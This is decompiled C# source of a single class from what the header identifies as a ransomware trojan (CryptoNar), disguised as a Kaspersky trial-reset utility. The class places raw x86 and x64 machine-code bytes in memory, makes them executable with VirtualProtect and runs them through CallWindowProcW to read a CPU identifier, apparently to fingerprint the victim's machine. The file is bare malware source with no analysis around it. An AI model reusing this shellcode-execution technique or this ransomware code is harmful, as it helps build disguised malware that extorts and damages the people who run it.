// Decompiled with JetBrains decompiler
// Type: CryptoNar.CpuID
// Assembly: kasperskytrialreset, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 35F54376-B284-4294-89A4-F0FFEE9E54ED
// Assembly location: C:\Users\Administrateur\Downloads\toto\Trojan-Ransom.MSIL.Agent.gog-69ba1e841933539403aedc15b34736c76a0dd6cb4874d262f29bce1fa3493d1c.exe

using System;
using System.Runtime.InteropServices;

namespace CryptoNar
{
  public static class CpuID
  {
    private const int PAGE_EXECUTE_READWRITE = 64;

    public static string getCpuID() => CpuID.ProcessorId();

    [DllImport("user32", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr CallWindowProcW(
      [In] byte[] bytes,
      IntPtr hWnd,
      int msg,
      [In, Out] byte[] wParam,
      IntPtr lParam);

    [DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool VirtualProtect(
      [In] byte[] bytes,
      IntPtr size,
      int newProtect,
      out int oldProtect);

    private static string ProcessorId()
    {
      byte[] result = new byte[8];
      return !CpuID.ExecuteCode(ref result) ? "ND" : string.Format("{0}{1}", (object) BitConverter.ToUInt32(result, 4).ToString("X8"), (object) BitConverter.ToUInt32(result, 0).ToString("X8"));
    }

    private static bool ExecuteCode(ref byte[] result)
    {
      byte[] bytes1 = new byte[26]
      {
        (byte) 85,
        (byte) 137,
        (byte) 229,
        (byte) 87,
        (byte) 139,
        (byte) 125,
        (byte) 16,
        (byte) 106,
        (byte) 1,
        (byte) 88,
        (byte) 83,
        (byte) 15,
        (byte) 162,
        (byte) 137,
        (byte) 7,
        (byte) 137,
        (byte) 87,
        (byte) 4,
        (byte) 91,
        (byte) 95,
        (byte) 137,
        (byte) 236,
        (byte) 93,
        (byte) 194,
        (byte) 16,
        (byte) 0
      };
      byte[] bytes2 = new byte[19]
      {
        (byte) 83,
        (byte) 72,
        (byte) 199,
        (byte) 192,
        (byte) 1,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 15,
        (byte) 162,
        (byte) 65,
        (byte) 137,
        (byte) 0,
        (byte) 65,
        (byte) 137,
        (byte) 80,
        (byte) 4,
        (byte) 91,
        (byte) 195
      };
      int oldProtect;
      if (CpuID.IsX64Process())
      {
        IntPtr num = new IntPtr(bytes2.Length);
        if (!CpuID.VirtualProtect(bytes2, num, 64, out oldProtect))
          Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());
        num = new IntPtr(result.Length);
        return CpuID.CallWindowProcW(bytes2, IntPtr.Zero, 0, result, num) != IntPtr.Zero;
      }
      IntPtr num1 = new IntPtr(bytes1.Length);
      if (!CpuID.VirtualProtect(bytes1, num1, 64, out oldProtect))
        Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());
      num1 = new IntPtr(result.Length);
      return CpuID.CallWindowProcW(bytes1, IntPtr.Zero, 0, result, num1) != IntPtr.Zero;
    }

    private static bool IsX64Process() => IntPtr.Size == 8;
  }
}
